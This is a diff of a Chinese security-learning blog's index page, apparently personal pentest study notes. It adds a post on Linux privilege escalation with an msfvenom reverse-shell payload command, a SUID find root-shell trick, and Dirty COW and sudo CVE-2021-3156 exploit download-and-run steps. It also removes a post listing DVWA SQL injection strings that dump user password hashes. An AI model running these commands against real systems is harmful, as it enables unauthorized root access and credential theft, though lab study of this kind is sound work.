@@ -64,6 +64,74 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-linux提权" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/08/01/linux%E6%8F%90%E6%9D%83/" class="article-date">
+  <time datetime="2021-08-01T07:25:43.000Z" itemprop="datePublished">2021-08-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/01/linux%E6%8F%90%E6%9D%83/">linux提权</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>metasplitable2:msfadmin/msfadmin</p>
+<p>searchsploit: 查找漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux木马生成:</span><br><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.135 lport&#x3D;4444 -f elf -o shell.elf</span><br></pre></td></tr></table></figure>
+
+<h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>suid:默认会以特权用户的权限去执行</p>
+<p>s:特权用户</p>
+<p>加入有suid文件可以进入交互模式,那么就可以用提权或者做后门.</p>
+<p>less | more | tail</p>
+<p>apt | apt-get….</p>
+<p>提权步骤:</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null –&gt; 查找具有suid权限的文件</p>
+<p>以find命令为例:</p>
+<p>find /etc/passwd -exec /bin/bash -p ;  –&gt; 利用文件进入root权限的bash</p>
+<figure class="highlight plain"><figcaption><span>https://gtfobins.github.io/</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>文件权限:<br>-:代表文件<br>l:代表链接(软链接–&gt;快捷方式;硬链接–&gt;复制了一份源文件)<br>d:代表目录<br>r 4:可读(read)<br>w 2:可写(write)<br>x 1:可执行(execution)</p>
+<p>d rwx r-x r-x<br>d:目录<br>rwx:当前用户的权限<br>r-x:当前用户组的权限<br>r-x:其他用户组的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 内核提权漏洞</span><br><span class="line"></span><br><span class="line">脏牛漏洞:</span><br><span class="line"></span><br><span class="line">exp: https:&#x2F;&#x2F;github.com&#x2F;FireFart&#x2F;dirtycow&#x2F;blob&#x2F;master&#x2F;dirty.c</span><br><span class="line"></span><br><span class="line">1.上传脏牛到靶机</span><br><span class="line"></span><br><span class="line">2.对脏牛漏洞进行编译:</span><br><span class="line"></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">3.使用漏洞</span><br><span class="line"></span><br><span class="line">chmod u+x dirty</span><br><span class="line"></span><br><span class="line">.&#x2F;dirty 123123 &lt;-- 自定义的密码, 默认用户是firefart</span><br><span class="line"></span><br><span class="line">4.换源&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">#### 利用sudo提权</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>漏洞探测:<br>    用户可以使用非root的账户登录系统，运行“ sudoedit -s / ”命令，<br>    若返回如图以“ sudoedit：”开头的错误，则当前系统可能存在安全风险。<br>    不受影响的系统将显示以“ usage：”开头的错误响应。</p>
+<p>影响范围:<br>Sudo 1.8.2 - 1.8.31p2<br>Sudo 1.9.0 - 1.9.5p1</p>
+<p>poc地址: <a target="_blank" rel="noopener" href="https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz">https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</a></p>
+<p>利用:<br>wget <a target="_blank" rel="noopener" href="https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz">https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</a><br>tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz<br>cd CVE-2021-3156<br>chmod u+x *<br>make<br>./sudo-hax-me-a-sandwich 0</p>
+<pre><code>
+linux漏洞库: 
+
+https://github.com/qazbnm456/awesome-cve-poc
+
+https://github.com/SecWiki/linux-kernel-exploits
+
+
+
+shellcode: 机器码(二进制,十六进制)
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckvl2qei9000h54vj6aqnay5p" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-windows后门植入和linux信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
@@ -125,7 +193,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckvgf14jh000nxkvj3zc3fk0k" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckvl2qeif000o54vj09u2500e" class="article-share-link">Share</a>
       
       
     </footer>
@@ -211,7 +279,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckvgf14jh000oxkvjdypydsnu" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckvl2qeif000p54vj1ddyf7yr" class="article-share-link">Share</a>
       
       
     </footer>
@@ -270,7 +338,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckvgf14ja000fxkvj90ma63os" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckvl2qeia000i54vj2xcc3cvi" class="article-share-link">Share</a>
       
       
     </footer>
@@ -388,7 +456,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckvgf14ir0002xkvj6p5ggwnz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckvl2qehv000254vj2cc04bfw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -448,7 +516,7 @@
 <ol>
 <li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p>
 </li>
-<li><p>db_connect user:<a href="mailto:&#x70;&#97;&#x73;&#x73;&#119;&#x6f;&#x72;&#x64;&#64;&#49;&#x32;&#55;&#46;&#x30;&#46;&#x30;&#x2e;&#49;">&#x70;&#97;&#x73;&#x73;&#119;&#x6f;&#x72;&#x64;&#64;&#49;&#x32;&#55;&#46;&#x30;&#46;&#x30;&#x2e;&#49;</a>/database_name</p>
+<li><p>db_connect user:<a href="mailto:&#x70;&#x61;&#115;&#115;&#119;&#x6f;&#x72;&#x64;&#64;&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;">&#x70;&#x61;&#115;&#115;&#119;&#x6f;&#x72;&#x64;&#64;&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;</a>/database_name</p>
 </li>
 </ol>
 <h5 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令:"></a>基础指令:</h5><h5 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h5><p>msf是用ruby语言写的,脚本后缀为.rc文件</p>
@@ -498,7 +566,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckvgf14iz0003xkvj7y2760f8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckvl2qehw000354vj6w34ei1c" class="article-share-link">Share</a>
       
       
     </footer>
@@ -556,7 +624,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckvgf14j40008xkvj7gdvf63x" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckvl2qei1000854vja8pu52m9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -666,7 +734,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckvgf14jl000rxkvjdsox90ch" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckvl2qeii000s54vj6v98emqw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -718,7 +786,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckvgf14jw0015xkvj0h02e4lu" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckvl2qej3001554vjhkpe7ci5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -795,44 +863,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckvgf14jq000yxkvj8o3u7e5g" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-SQLlow等级手工注入" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time datetime="2020-08-28T14:30:18.000Z" itemprop="datePublished">2020-08-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">SQLlow等级手工注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1.登录DVWA，设置安全等级为LOW<br>2.输入1’order by 2#,有数据内容出现，输入1’order by 3#,没有数据内容显示，说明数据列只有2列<br>3.输入1’union select database(),user()#,查询数据库的名字，用户名<br>4.输入1’union select version(),@@version_compile_os#’,获取数据库版本和当前操作系统<br>5.输入1’union select table_name,table_schema from information_schema.tables where table_schema= ’dvwa’#,获取数据表的名称，注意’dvwa’前面有空格<br>6.输入1’union select user,password from users#,尝试获得用户名和密码<br>7.密码采用md5进行加密，到<a target="_blank" rel="noopener" href="http://www.cmd5.com进行解密/">www.cmd5.com进行解密</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckvgf14j10005xkvj48ryepbi" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckvl2qeit001254vjb52531q9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -878,6 +909,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
           </li>
         
@@ -891,10 +926,6 @@
         
           <li>
             <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/">文件上传漏洞的上传逻辑安全</a>
           </li>
         
       </ul>
